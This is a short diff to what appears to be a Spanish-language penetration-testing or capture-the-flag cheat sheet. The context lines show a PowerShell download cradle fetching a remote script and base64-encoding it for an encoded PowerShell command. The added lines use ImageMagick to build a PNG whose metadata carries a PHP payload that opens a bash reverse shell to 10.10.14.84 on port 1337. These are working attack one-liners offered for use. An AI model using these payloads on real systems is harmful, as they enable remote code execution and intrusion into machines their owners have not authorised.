@@ -28,4 +28,7 @@ ps -eo user,command
 iex(New.Object Net.WebClient).downloadString("target_ip/ps.ps1") | iconv -t utf-16ble | base64 -w 0; echo
 
 powershell -enc "base64"
+
+# creamos un png y lo llamamos con php por ejemplo
+convert xc:red -set 'Copyright' '<?php system("bash -i >& /dev/tcp/10.10.14.84/1337 0>&1"); ?>' payload.png
 ```
